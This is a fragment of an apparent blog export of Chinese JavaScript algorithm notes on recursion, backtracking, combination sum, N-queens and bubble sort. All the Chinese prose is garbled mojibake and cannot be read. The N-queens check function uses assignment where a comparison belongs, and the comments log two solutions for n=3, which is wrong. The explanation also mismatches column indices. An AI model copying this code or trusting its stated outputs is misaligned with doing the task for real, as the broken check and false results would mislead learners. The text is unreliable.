å¤§ï¼Œåˆ™ç›´æŽ¥åˆ©ç”¨å®ƒä¹‹å‰çš„å­—ç¬¦ä¸²æ‰€æ±‚å¾—ç»“æžœ if (curr &gt; '0') &#123; count = decode(chars, index - 1) &#125; // ç”±å‰ä¸€ä¸ªå­—ç¬¦å’Œå½“å‰å­—ç¬¦æž„æˆçš„æ•°å­—ï¼Œå€¼å¿…é¡»è¦åœ¨1å’Œ26ä¹‹é—´ï¼Œå¦åˆ™æ— æ³•ç¼–ç  if (prev === '1' || (prev == '2' &amp;&amp; curr &lt;= '6')) &#123; count += decode(chars, index - 2) &#125; return count&#125;console.log('count: ', numDecoding('1213')) // count: 5 é€’å½’é—®é¢˜è§£é¢˜æ¨¡æ¿é€šè¿‡ä¸Šè¿°ä¾‹é¢˜ï¼Œæ¥å½’çº³æ€»ç»“ä¸€ä¸‹é€’å½’å‡½æ•°çš„è§£é¢˜æ¨¡ç‰ˆã€‚ è§£é¢˜æ­¥éª¤ åˆ¤æ–­å½“å‰æƒ…å†µæ˜¯å¦éžæ³•ï¼Œå¦‚æžœéžæ³•å°±ç«‹å³è¿”å›žï¼Œè¿™ä¸€æ­¥ä¹Ÿè¢«ç§°ä¸ºå®Œæ•´æ€§æ£€æŸ¥ï¼ˆSanity Checkï¼‰ã€‚ä¾‹å¦‚ï¼Œçœ‹çœ‹å½“å‰å¤„ç†çš„æƒ…å†µæ˜¯å¦è¶Šç•Œï¼Œæ˜¯å¦å‡ºçŽ°äº†ä¸æ»¡è¶³æ¡ä»¶çš„æƒ…å†µã€‚é€šå¸¸ï¼Œè¿™ä¸€éƒ¨åˆ†ä»£ç éƒ½æ˜¯å†™åœ¨æœ€å‰é¢çš„ã€‚ åˆ¤æ–­æ˜¯å¦æ»¡è¶³ç»“æŸé€’å½’çš„æ¡ä»¶ã€‚åœ¨è¿™ä¸€æ­¥å½“ä¸­ï¼Œå¤„ç†çš„åŸºæœ¬ä¸Šéƒ½æ˜¯ä¸€äº›æŽ¨å¯¼è¿‡ç¨‹å½“ä¸­æ‰€å®šä¹‰çš„åˆå§‹æƒ…å†µã€‚ å°†é—®é¢˜çš„è§„æ¨¡ç¼©å°ï¼Œé€’å½’è°ƒç”¨ã€‚åœ¨å½’å¹¶æŽ’åºå’Œå¿«é€ŸæŽ’åºä¸­ï¼Œæˆ‘ä»¬å°†é—®é¢˜çš„è§„æ¨¡ç¼©å°äº†ä¸€åŠï¼Œè€Œåœ¨æ±‰è¯ºå¡”å’Œè§£ç çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†é—®é¢˜çš„è§„æ¨¡ç¼©å°äº†ä¸€ä¸ªã€‚ åˆ©ç”¨åœ¨å°è§„æ¨¡é—®é¢˜ä¸­çš„ç­”æ¡ˆï¼Œç»“åˆå½“å‰çš„æ•°æ®è¿›è¡Œæ•´åˆï¼Œå¾—å‡ºæœ€ç»ˆçš„ç­”æ¡ˆã€‚ é€’å½’é—®é¢˜è§£é¢˜æ¨¡æ¿ä»£ç å®žçŽ°12345678910111213141516171819function fn(n) &#123; // ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­è¾“å…¥æˆ–è€…çŠ¶æ€æ˜¯å¦éžæ³•ï¼Ÿ if (input/state is invalid) &#123; return; &#125; // ç¬¬äºŒæ­¥ï¼šåˆ¤è¯»é€’å½’æ˜¯å¦åº”å½“ç»“æŸ? if (match condition) &#123; return some value; &#125; // ç¬¬ä¸‰æ­¥ï¼šç¼©å°é—®é¢˜è§„æ¨¡ result1 = fn(n1) result2 = fn(n2) ... // ç¬¬å››æ­¥: æ•´åˆç»“æžœ return combine(result1, result2)&#125; ä¸­å¿ƒå¯¹ç§°æ•°é—®é¢˜LeetCode ç¬¬ 247 é¢˜ï¼šæ‰¾åˆ°æ‰€æœ‰é•¿åº¦ä¸º n çš„ä¸­å¿ƒå¯¹ç§°æ•°ã€‚ ç¤ºä¾‹è¾“å…¥: n = 2è¾“å‡º: [â€œ11â€,â€69â€,â€88â€,â€96â€] ä¸­å¿ƒå¯¹ç§°æ•°é—®é¢˜è§£é¢˜æ€è·¯ å½“ n=0 çš„æ—¶å€™ï¼Œåº”è¯¥è¾“å‡ºç©ºå­—ç¬¦ä¸²ï¼šâ€œ â€ã€‚ å½“ n=1 çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯é•¿åº¦ä¸º 1 çš„ä¸­å¿ƒå¯¹ç§°æ•°æœ‰ï¼š0ï¼Œ1ï¼Œ8ã€‚ å½“ n=2 çš„æ—¶å€™ï¼Œé•¿åº¦ä¸º 2 çš„ä¸­å¿ƒå¯¹ç§°æ•°æœ‰ï¼š11ï¼Œ 69ï¼Œ88ï¼Œ96ã€‚æ³¨æ„ï¼š00 å¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„ç»“æžœã€‚ å½“ n=3 çš„æ—¶å€™ï¼Œåªéœ€è¦åœ¨é•¿åº¦ä¸º 1 çš„åˆæ³•ä¸­å¿ƒå¯¹ç§°æ•°çš„åŸºç¡€ä¸Šï¼Œä¸æ–­åœ°åœ¨ä¸¤è¾¹æ·»åŠ  11ï¼Œ69ï¼Œ88ï¼Œ96 å°±å¯ä»¥äº†ã€‚ [101, 609, 808, 906, 111, 619, 818, 916, 181, 689, 888, 986] éšç€ n ä¸æ–­åœ°å¢žé•¿ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨é•¿åº¦ä¸º n-2 çš„ä¸­å¿ƒå¯¹ç§°æ•°ä¸¤è¾¹æ·»åŠ  11ï¼Œ69ï¼Œ88ï¼Œ96 å³å¯ã€‚ ä¸­å¿ƒå¯¹ç§°æ•°é—®é¢˜ä»£ç å®žçŽ°12345678910111213141516171819202122232425262728293031const helper = function (n) &#123; debugger // ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­è¾“å…¥æˆ–çŠ¶æ€æ˜¯å¦éžæ³• if (n &lt; 0) &#123; throw new Error('illegal argument') &#125; // ç¬¬äºŒæ­¥ï¼šåˆ¤è¯»é€’å½’æ˜¯å¦åº”å½“ç»“æŸ if (n === 0) &#123; return [''] &#125; if (n === 1) &#123; return ['0', '1', '8'] &#125; // ç¬¬ä¸‰æ­¥ï¼šç¼©å°é—®é¢˜è§„æ¨¡ const list = helper(n - 2) // ç¬¬å››æ­¥ï¼šæ•´åˆç»“æžœ const res = [] for (let i = 0; i &lt; list.length; i++) &#123; let s = list[i] res.push('1' + s + '1') res.push('6' + s + '9') res.push('8' + s + '8') res.push('9' + s + '6') &#125; return res&#125;console.log(helper(2)) // [ '11', '69', '88', '96' ] å›žæº¯ï¼ˆBacktrackingï¼‰å›žæº¯ç®—æ³•æ€æƒ³å›žæº¯å®žé™…ä¸Šæ˜¯ä¸€ç§è¯•æŽ¢ç®—æ³•ï¼Œè¿™ç§ç®—æ³•è·Ÿæš´åŠ›æœç´¢æœ€å¤§çš„ä¸åŒåœ¨äºŽï¼Œåœ¨å›žæº¯ç®—æ³•é‡Œï¼Œæ˜¯ä¸€æ­¥ä¸€æ­¥åœ°å°å¿ƒç¿¼ç¿¼åœ°è¿›è¡Œå‘å‰è¯•æŽ¢ï¼Œä¼šå¯¹æ¯ä¸€æ­¥æŽ¢æµ‹åˆ°çš„æƒ…å†µè¿›è¡Œè¯„ä¼°ï¼Œå¦‚æžœå½“å‰çš„æƒ…å†µå·²ç»æ— æ³•æ»¡è¶³è¦æ±‚ï¼Œé‚£ä¹ˆå°±æ²¡æœ‰å¿…è¦ç»§ç»­è¿›è¡Œä¸‹åŽ»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬é¿å…èµ°å¾ˆå¤šçš„å¼¯è·¯ã€‚ å›žæº¯ç®—æ³•çš„ç‰¹ç‚¹åœ¨äºŽï¼Œå½“å‡ºçŽ°éžæ³•çš„æƒ…å†µæ—¶ï¼Œç®—æ³•å¯ä»¥å›žé€€åˆ°ä¹‹å‰çš„æƒ…æ™¯ï¼Œå¯ä»¥æ˜¯è¿”å›žä¸€æ­¥ï¼Œæœ‰æ—¶å€™ç”šè‡³å¯ä»¥è¿”å›žå¤šæ­¥ï¼Œç„¶åŽå†åŽ»å°è¯•åˆ«çš„è·¯å¾„å’ŒåŠžæ³•ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œæƒ³è¦é‡‡ç”¨å›žæº¯ç®—æ³•ï¼Œå°±å¿…é¡»ä¿è¯ï¼Œæ¯æ¬¡éƒ½æœ‰å¤šç§å°è¯•çš„å¯èƒ½ã€‚ å›žæº¯ç®—æ³•è§£é¢˜æ¨¡æ¿è§£é¢˜æ­¥éª¤ï¼š åˆ¤æ–­å½“å‰æƒ…å†µæ˜¯å¦éžæ³•ï¼Œå¦‚æžœéžæ³•å°±ç«‹å³è¿”å›žï¼› å½“å‰æƒ…å†µæ˜¯å¦å·²ç»æ»¡è¶³é€’å½’ç»“æŸæ¡ä»¶ï¼Œå¦‚æžœæ˜¯å°±å°†å½“å‰ç»“æžœä¿å­˜èµ·æ¥å¹¶è¿”å›žï¼› å½“å‰æƒ…å†µä¸‹ï¼ŒéåŽ†æ‰€æœ‰å¯èƒ½å‡ºçŽ°çš„æƒ…å†µå¹¶è¿›è¡Œä¸‹ä¸€æ­¥çš„å°è¯•ï¼› é€’å½’å®Œæ¯•åŽï¼Œç«‹å³å›žæº¯ï¼Œå›žæº¯çš„æ–¹æ³•å°±æ˜¯å–æ¶ˆå‰ä¸€æ­¥è¿›è¡Œçš„å°è¯•ã€‚ å›žæº¯ç®—æ³•è§£é¢˜ä»£ç 12345678910111213141516171819202122function fn(n) &#123; // ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­è¾“å…¥æˆ–è€…çŠ¶æ€æ˜¯å¦éžæ³•ï¼Ÿ if (input/state is invalid) &#123; return; &#125; // ç¬¬äºŒæ­¥ï¼šåˆ¤è¯»é€’å½’æ˜¯å¦åº”å½“ç»“æŸ? if (match condition) &#123; return some value; &#125; // éåŽ†æ‰€æœ‰å¯èƒ½å‡ºçŽ°çš„æƒ…å†µ for (all possible cases) &#123; // ç¬¬ä¸‰æ­¥: å°è¯•ä¸‹ä¸€æ­¥çš„å¯èƒ½æ€§ solution.push(case) // é€’å½’ result = fn(m) // ç¬¬å››æ­¥ï¼šå›žæº¯åˆ°ä¸Šä¸€æ­¥ solution.pop(case) &#125;&#125; å‡‘æ•´æ•°é—®é¢˜LeetCode ç¬¬ 39 é¢˜ï¼šç»™å®šä¸€ä¸ªæ— é‡å¤å…ƒç´ çš„æ•°ç»„ candidates å’Œä¸€ä¸ªç›®æ ‡æ•° target ï¼Œæ‰¾å‡º candidates ä¸­æ‰€æœ‰å¯ä»¥ä½¿æ•°å­—å’Œä¸º target çš„ç»„åˆã€‚candidates ä¸­çš„æ•°å­—å¯ä»¥æ— é™åˆ¶é‡å¤è¢«é€‰å–ã€‚ è¯´æ˜Žï¼šæ‰€æœ‰æ•°å­—ï¼ˆåŒ…æ‹¬ targetï¼‰éƒ½æ˜¯æ­£æ•´æ•°ã€‚è§£é›†ä¸èƒ½åŒ…å«é‡å¤çš„ç»„åˆã€‚ å‡‘æ•´æ•°é—®é¢˜è§£é¢˜æ€è·¯é¢˜ç›®è¦æ±‚çš„æ˜¯æ‰€æœ‰ä¸é‡å¤çš„å­é›†ï¼Œè€Œä¸”å­é›†é‡Œçš„å…ƒç´ çš„å€¼çš„æ€»å’Œç­‰äºŽä¸€ä¸ªç»™å®šçš„ç›®æ ‡ã€‚ æ€è·¯ 1ï¼šæš´åŠ›æ³•ã€‚ ç½—åˆ—å‡ºæ‰€æœ‰çš„å­é›†ç»„åˆï¼Œç„¶åŽé€ä¸ªåˆ¤æ–­å®ƒä»¬çš„æ€»å’Œæ˜¯å¦ä¸ºç»™å®šçš„ç›®æ ‡å€¼ã€‚è§£æ³•éžå¸¸æ…¢ã€‚ æ€è·¯ 2ï¼šå›žæº¯æ³•ã€‚ ä»Žä¸€ä¸ªç©ºçš„é›†åˆå¼€å§‹ï¼Œå°å¿ƒç¿¼ç¿¼åœ°å¾€é‡Œé¢æ·»åŠ å…ƒç´ ã€‚ æ¯æ¬¡æ·»åŠ ï¼Œæ£€æŸ¥ä¸€ä¸‹å½“å‰çš„æ€»å’Œæ˜¯å¦ç­‰äºŽç»™å®šçš„ç›®æ ‡ã€‚ å¦‚æžœæ€»å’Œå·²ç»è¶…å‡ºäº†ç›®æ ‡ï¼Œè¯´æ˜Žæ²¡æœ‰å¿…è¦å†å°è¯•å…¶ä»–çš„å…ƒç´ äº†ï¼Œè¿”å›žå¹¶å°è¯•å…¶ä»–çš„å…ƒç´ ï¼› å¦‚æžœæ€»å’Œç­‰äºŽç›®æ ‡ï¼Œå°±æŠŠå½“å‰çš„ç»„åˆæ·»åŠ åˆ°ç»“æžœå½“ä¸­ï¼Œè¡¨æ˜Žæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ç§æ»¡è¶³è¦æ±‚çš„ç»„åˆï¼ŒåŒæ—¶è¿”å›žï¼Œå¹¶è¯•å›¾å¯»æ‰¾å…¶ä»–çš„é›†åˆã€‚ å‡‘æ•´æ•°é—®é¢˜ä»£ç å®žçŽ°1234567891011121314151617181920212223242526272829const combinationSum = function (candidates, target) &#123; const results = [] backtracking(candidates, target, 0, [], results) return results&#125;const backtracking = function (candidates, target, start, solution, results) &#123; if (target &lt; 0) &#123; return false &#125; if (target === 0) &#123; results.push([...solution]) return true &#125; for (let i = start; i &lt; candidates.length; i++) &#123; solution.push(candidates[i]) backtracking(candidates, target - candidates[i], i, solution, results) solution.pop() &#125;&#125;console.log(combinationSum([1, 2, 3], 5))// [ [ 1, 1, 1, 1, 1 ],// [ 1, 1, 1, 2 ],// [ 1, 1, 3 ],// [ 1, 2, 2 ],// [ 2, 3 ] ] åœ¨ä¸»å‡½æ•°é‡Œï¼š å®šä¹‰ä¸€ä¸ª results æ•°ç»„ç”¨æ¥ä¿å­˜æœ€ç»ˆçš„ç»“æžœï¼› è°ƒç”¨å‡½æ•° backtrackingï¼Œå¹¶å°†åˆå§‹çš„æƒ…å†µä»¥åŠ results ä¼ é€’è¿›åŽ»ï¼Œè¿™é‡Œçš„åˆå§‹æƒ…å†µå°±æ˜¯ä»Žç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹å°è¯•ï¼Œè€Œä¸”åˆå§‹çš„å­é›†ä¸ºç©ºã€‚ åœ¨ backtracking å‡½æ•°é‡Œï¼š æ£€æŸ¥å½“å‰çš„å…ƒç´ æ€»å’Œæ˜¯å¦å·²ç»è¶…å‡ºäº†ç›®æ ‡ç»™å®šçš„å€¼ï¼Œæ¯æ·»åŠ è¿›ä¸€ä¸ªæ–°çš„å…ƒç´ æ—¶ï¼Œå°±å°†å®ƒä»Žç›®æ ‡æ€»å’Œä¸­å‡åŽ»ï¼› å¦‚æžœæ€»å’Œå·²ç»è¶…å‡ºäº†ç›®æ ‡ç»™å®šå€¼ï¼Œå°±ç«‹å³è¿”å›žï¼ŒåŽ»å°è¯•å…¶ä»–çš„æ•°å€¼ï¼› å¦‚æžœæ€»å’Œåˆšå¥½ç­‰äºŽç›®æ ‡å€¼ï¼Œå°±æŠŠå½“å‰çš„å­é›†æ·»åŠ åˆ°ç»“æžœä¸­ã€‚ åœ¨å¾ªçŽ¯ä½“å†…ï¼š æ¯æ¬¡æ·»åŠ äº†ä¸€ä¸ªæ–°çš„å…ƒç´ ï¼Œç«‹å³é€’å½’è°ƒç”¨ backtrackingï¼Œçœ‹æ˜¯å¦æ‰¾åˆ°äº†åˆé€‚çš„å­é›† é€’å½’å®Œæ¯•åŽï¼Œè¦æŠŠä¸Šæ¬¡å°è¯•çš„å…ƒç´ ä»Žå­é›†é‡Œåˆ é™¤ï¼Œè¿™æ˜¯æœ€é‡è¦çš„ã€‚ ä»¥ä¸Šï¼Œå°±å®Œæˆäº†å›žæº¯ã€‚ æç¤ºï¼šè¿™æ˜¯ä¸€ä¸ªæœ€ç»å…¸çš„å›žæº¯çš„é¢˜ç›®ï¼Œéº»é›€è™½å°ï¼Œä½†äº”è„ä¿±å…¨ã€‚å®ƒå®Œæ•´åœ°ä½“çŽ°äº†å›žæº¯ç®—æ³•çš„å„ä¸ªé˜¶æ®µã€‚ N çš‡åŽé—®é¢˜LeetCode ç¬¬ 51 é¢˜ï¼Œ åœ¨ä¸€ä¸ª NÃ—N çš„å›½é™…è±¡æ£‹æ£‹ç›˜ä¸Šæ”¾ç½® N ä¸ªçš‡åŽï¼Œæ¯è¡Œä¸€ä¸ªå¹¶ä½¿å¥¹ä»¬ä¸èƒ½äº’ç›¸æ”»å‡»ã€‚ç»™å®šä¸€ä¸ªæ•´æ•° Nï¼Œè¿”å›ž N çš‡åŽä¸åŒçš„çš„è§£å†³æ–¹æ¡ˆçš„æ•°é‡ã€‚ N çš‡åŽé—®é¢˜è§£é¢˜æ€è·¯è§£å†³ N çš‡åŽé—®é¢˜çš„å…³é”®å°±æ˜¯å¦‚ä½•åˆ¤æ–­å½“å‰å„ä¸ªçš‡åŽçš„æ‘†æ”¾æ˜¯å¦åˆæ³•ã€‚ åˆ©ç”¨ä¸€ä¸ªæ•°ç»„ columns[] æ¥è®°å½•æ¯ä¸€è¡Œé‡Œçš‡åŽæ‰€åœ¨çš„åˆ—ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€è¡Œçš„çš‡åŽå¦‚æžœæ”¾ç½®åœ¨ç¬¬ 5 åˆ—çš„ä½ç½®ä¸Šï¼Œé‚£ä¹ˆ columns[0] = 6ã€‚ä»Žç¬¬ä¸€è¡Œå¼€å§‹æ”¾ç½®çš‡åŽï¼Œæ¯è¡Œåªæ”¾ç½®ä¸€ä¸ªï¼Œå‡è®¾ä¹‹å‰çš„æ‘†æ”¾éƒ½ä¸ä¼šäº§ç”Ÿå†²çªï¼ŒçŽ°åœ¨å°†çš‡åŽæ”¾åœ¨ç¬¬ row è¡Œç¬¬ col åˆ—ä¸Šï¼Œæ£€æŸ¥ä¸€ä¸‹è¿™æ ·çš„æ‘†æ”¾æ˜¯å¦åˆç†ã€‚ æ–¹æ³•å°±æ˜¯æ²¿ç€ä¸¤ä¸ªæ–¹å‘æ£€æŸ¥æ˜¯å¦å­˜åœ¨å†²çªå°±å¯ä»¥äº†ã€‚ N çš‡åŽé—®é¢˜ä»£ç å®žçŽ°é¦–å…ˆï¼Œä»Žç¬¬ä¸€è¡Œå¼€å§‹ç›´åˆ°ç¬¬ row è¡Œçš„å‰ä¸€è¡Œä¸ºæ­¢ï¼Œçœ‹é‚£ä¸€è¡Œæ‰€æ”¾ç½®çš„çš‡åŽæ˜¯å¦åœ¨ col åˆ—ä¸Šï¼Œæˆ–è€…æ˜¯ä¸æ˜¯åœ¨å®ƒçš„å¯¹è§’çº¿ä¸Šï¼Œä»£ç å¦‚ä¸‹ã€‚ 123456789const check = function (row, col, columns) &#123; for (let r = 0; r &lt; row; r++) &#123; // å…¶ä»–çš‡åŽæ˜¯å¦åœ¨å½“å‰æ”¾ç½®çš‡åŽçš„åˆ—å’Œå¯¹è§’çº¿ä¸Š if ((columns[r] = col || row - r == Math.abs(columns[r] - col))) &#123; return false &#125; &#125; return true&#125; ç„¶åŽè¿›è¡Œå›žæº¯çš„æ“ä½œï¼Œä»£ç å¦‚ä¸‹ã€‚ 123456789101112131415161718192021222324252627282930const totalNQueens = function (n) &#123; const results = [] backtracking(n, 0, [], [], results) console.log('results: ', results) // results: [ [ [ 0, 0 ], [ 1, 0 ], [ 2, 0 ] ],[ [ 0, 2 ], [ 1, 0 ], [ 2, 0 ] ] ] console.log('count: ', results.length) // count: 2&#125;const backtracking = function (n, row, columns, solution, results) &#123; // æ˜¯å¦åœ¨æ‰€æœ‰ n è¡Œé‡Œéƒ½æ‘†å¥½äº†çš‡åŽ if (row === n) &#123; results.push([...solution]) return &#125; // å°è¯•å°†çš‡åŽæ”¾ç½®åˆ°å½“å‰è¡Œä¸­çš„æ¯ä¸€åˆ— for (let col = 0; col &lt; n; col++) &#123; columns[row] = col solution.push([row, col]) // æ£€æŸ¥æ˜¯å¦åˆæ³•ï¼Œå¦‚æžœåˆæ³•å°±ç»§ç»­åˆ°ä¸‹ä¸€è¡Œ if (check(row, col, columns)) &#123; backtracking(n, row + 1, columns, solution, results) &#125; solution.pop() // å¦‚æžœä¸åˆæ³•ï¼Œå°±ä¸è¦æŠŠçš‡åŽæ”¾åœ¨è¿™åˆ—ä¸­ columns[row] = -1 &#125;&#125;totalNQueens(3)]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ã€Œè¶…è¯¦ç¬”è®°ã€ç®—æ³•â€”â€”æŽ’åºï¼ˆJSç‰ˆï¼‰]]></title>
    <url>%2F2020%2F11%2F05%2Falgorithm-sort%2F</url>
    <content type="text"><![CDATA[å†’æ³¡æŽ’åºï¼ˆBubble Sortï¼‰å†’æ³¡æŽ’åºåŸºæœ¬æ€æƒ³ç»™å®šä¸€ä¸ªæ•°ç»„ï¼Œæˆ‘ä»¬æŠŠæ•°ç»„é‡Œçš„å…ƒç´ é€šé€šå€’å…¥åˆ°æ°´æ± ä¸­ï¼Œè¿™äº›å…ƒç´ å°†é€šè¿‡ç›¸äº’ä¹‹é—´çš„æ¯”è¾ƒï¼ŒæŒ‰ç…§å¤§å°é¡ºåºä¸€ä¸ªä¸€ä¸ªåœ°åƒæ°”æ³¡ä¸€æ ·æµ®å‡ºæ°´é¢ã€‚ å†’æ³¡æŽ’åºå®žçŽ°æ¯ä¸€è½®ï¼Œä»Žæ‚ä¹±æ— ç« çš„æ•°ç»„å¤´éƒ¨å¼€å§‹ï¼Œæ¯ä¸¤ä¸ªå…ƒç´ æ¯”è¾ƒå¤§å°å¹¶è¿›è¡Œäº¤æ¢ï¼Œç›´åˆ°è¿™ä¸€è½®å½“ä¸­æœ€å¤§æˆ–æœ€å°çš„å…ƒç´ è¢«æ”¾ç½®åœ¨æ•°ç»„çš„å°¾éƒ¨ï¼Œç„¶åŽä¸æ–­åœ°é‡å¤è¿™ä¸ªè¿‡ç¨‹ï¼Œç›´åˆ°æ‰€æœ‰å…ƒç´ éƒ½æŽ’å¥½ä½ç½®ã€‚å…¶ä¸­ï¼Œæ ¸å¿ƒæ“ä½œå°±æ˜¯å…ƒç´ ç›¸äº’æ¯”è¾ƒã€‚ å†’æ³¡æŽ’åºä¾‹é¢˜åˆ†æžç»™å®šæ•°ç»„ [2, 1, 7, 9, 5, 8]ï¼Œè¦æ±‚æŒ‰ç…§ä»Žå·¦åˆ°å³ã€ä»Žå°åˆ°å¤§çš„é¡ºåºè¿›è¡ŒæŽ’åºã€‚ å†’æ³¡æŽ’åºè§£é¢˜æ€è·¯ä»Žå·¦åˆ°å³ä¾æ¬¡å†’æ³¡ï¼ŒæŠŠè¾ƒå¤§çš„æ•°å¾€å³è¾¹æŒªåŠ¨å³å¯ã€‚ é¦–å…ˆæŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªæ•°ï¼Œæ¯”è¾ƒç¬¬ä¸€ä¸ªæ•°å’Œç¬¬äºŒä¸ªæ•°çš„å¤§å°ï¼Œç”±äºŽ 2 æ¯” 1 å¤§ï¼Œæ‰€ä»¥ä¸¤ä¸¤äº¤æ¢ï¼Œ[1, 2, 7, 9, 5, 8]ã€‚ æŽ¥ä¸‹æ¥æŒ‡é’ˆå¾€å‰ç§»åŠ¨ä¸€æ­¥ï¼Œæ¯”è¾ƒ 2 å’Œ 7ï¼Œç”±äºŽ 2 æ¯” 7 å°ï¼Œä¸¤è€…ä¿æŒä¸åŠ¨ï¼Œ[1, 2, 7, 9, 5, 8]ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œ7 æ˜¯æœ€å¤§çš„é‚£ä¸ªæ•°ã€‚ æŒ‡é’ˆç»§ç»­å¾€å‰ç§»åŠ¨ï¼Œæ¯”è¾ƒ 7 å’Œ 9ï¼Œç”±äºŽ 7 æ¯” 9 å°ï¼Œä¸¤è€…ä¿æŒä¸åŠ¨ï¼Œ[1, 2, 7, 9, 5, 8]ã€‚çŽ°åœ¨ï¼Œ9 å˜æˆäº†æœ€å¤§çš„é‚£ä¸ªæ•°ã€‚ å†å¾€åŽï¼Œæ¯”è¾ƒ 9 å’Œ 5ï¼Œå¾ˆæ˜Žæ˜¾ï¼Œ9 æ¯” 5 å¤§ï¼Œäº¤æ¢å®ƒä»¬çš„ä½ç½®ï¼Œ[1, 2, 7, 5, 9, 8]ã€‚ æœ€åŽï¼Œæ¯”è¾ƒ 9 å’Œ 8ï¼Œ9 æ¯” 8 å¤§ï¼Œäº¤æ¢å®ƒä»¬çš„ä½ç½®ï¼Œ[1, 2, 7, 5, 8, 9]ã€‚ç»è¿‡ç¬¬ä¸€è½®çš„ä¸¤ä¸¤æ¯”è¾ƒï¼Œ9 è¿™ä¸ªæœ€å¤§çš„æ•°å°±åƒå†’æ³¡ä¸€æ ·å†’åˆ°äº†æ•°ç»„çš„æœ€åŽé¢ã€‚ æŽ¥ä¸‹æ¥è¿›è¡Œç¬¬äºŒè½®çš„æ¯”è¾ƒï¼ŒæŠŠæŒ‡é’ˆé‡æ–°æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œé‡å¤ä¸Šé¢çš„æ“ä½œï¼Œæœ€åŽï¼Œæ•°ç»„å˜æˆäº†ï¼š[1, 2, 5, 7, 8, 9]ã€‚ åœ¨è¿›è¡Œæ–°ä¸€è½®çš„æ¯”è¾ƒä¸­ï¼Œåˆ¤æ–­ä¸€ä¸‹åœ¨ä¸Šä¸€è½®æ¯”è¾ƒçš„è¿‡ç¨‹ä¸­æœ‰æ²¡æœ‰å‘ç”Ÿä¸¤ä¸¤äº¤æ¢ï¼Œå¦‚æžœä¸€æ¬¡äº¤æ¢éƒ½æ²¡æœ‰å‘ç”Ÿï¼Œå°±è¯æ˜Žå…¶å®žæ•°ç»„å·²ç»æŽ’å¥½åºäº†ã€‚ å†’æ³¡æŽ’åºä»£ç ç¤ºä¾‹1234567891011121314151617181920212223// å†’æ³¡æŽ’åºç®—æ³•const bubbleSort = function (arr) &#123; const len = arr.length // æ ‡è®°æ¯ä¸€è½®æ˜¯å¦å‘ç”Ÿæ¥äº¤æ¢ let hasChange = true // å¦‚æžœæ²¡æœ‰å‘ç”Ÿäº¤æ¢åˆ™å·²ç»æ˜¯æŽ’å¥½åºçš„ï¼Œç›´æŽ¥è·³å‡ºå¤–å±‚éåŽ† for (let i = 0; i &lt; len &amp;&amp; hasChange; i++) &#123; hasChange = false for (let j = 0; j &lt; len - 1 - i; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; let temp = arr[j] arr[j] = arr[j + 1] arr[j + 1] = temp hasChange = true &#125; &#125; &#125;&#125;const arr = [2, 1, 7, 9, 5, 8]bubbleSort(arr)console.log('arr: ', arr) å†’æ³¡æŽ’åºç®—æ³•åˆ†æžå†’æ³¡æŽ’åºç©ºé—´å¤æ‚åº¦å‡è®¾æ•°ç»„çš„å…ƒç´ ä¸ªæ•°æ˜¯ nï¼Œç”±äºŽåœ¨æ•´ä¸ªæŽ’åºçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ˜¯ç›´æŽ¥åœ¨ç»™å®šçš„æ•°ç»„é‡Œé¢è¿›è¡Œå…ƒç´ çš„ä¸¤ä¸¤äº¤æ¢ï¼Œæ‰€ä»¥ç©ºé—´å¤æ‚åº¦æ˜¯ O(1)ã€‚ å†’æ³¡æŽ’åºæ—¶é—´å¤æ‚åº¦ç»™å®šçš„æ•°ç»„æŒ‰ç…§é¡ºåºå·²ç»æŽ’å¥½ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦è¿›è¡Œ nâˆ’1 æ¬¡çš„æ¯”è¾ƒï¼Œä¸¤ä¸¤äº¤æ¢æ¬¡æ•°ä¸º 0ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(n)ã€‚è¿™æ˜¯æœ€å¥½çš„æƒ…å†µã€‚ ç»™å®šçš„æ•°ç»„æŒ‰ç…§é€†åºæŽ’åˆ—ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œ n(n-1)/2 æ¬¡æ¯”è¾ƒï¼Œæ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ã€‚è¿™æ˜¯æœ€åçš„æƒ…å†µã€‚ ç»™å®šçš„æ•°ç»„æ‚ä¹±æ— ç« ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¹³å‡æ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ã€‚ ç”±æ­¤å¯è§ï¼Œå†’æ³¡æŽ’åºçš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(n2)ã€‚å®ƒæ˜¯ä¸€ç§ç¨³å®šçš„æŽ’åºç®—æ³•ã€‚ï¼ˆç¨³å®šæ˜¯æŒ‡å¦‚æžœæ•°ç»„é‡Œä¸¤ä¸ªç›¸ç­‰çš„æ•°ï¼Œé‚£ä¹ˆæŽ’åºå‰åŽè¿™ä¸¤ä¸ªç›¸ç­‰çš„æ•°çš„ç›¸å¯¹ä½ç½®ä¿æŒä¸å˜ã€‚ï¼‰ æ’å…¥æŽ’åºï¼ˆInsertion Sortï¼‰æ’å…¥æŽ’åºåŸºæœ¬æ€æƒ³ä¸æ–­åœ°å°†å°šæœªæŽ’å¥½åºçš„æ•°æ’å…¥åˆ°å·²ç»æŽ’å¥½åºçš„éƒ¨åˆ†ã€‚ 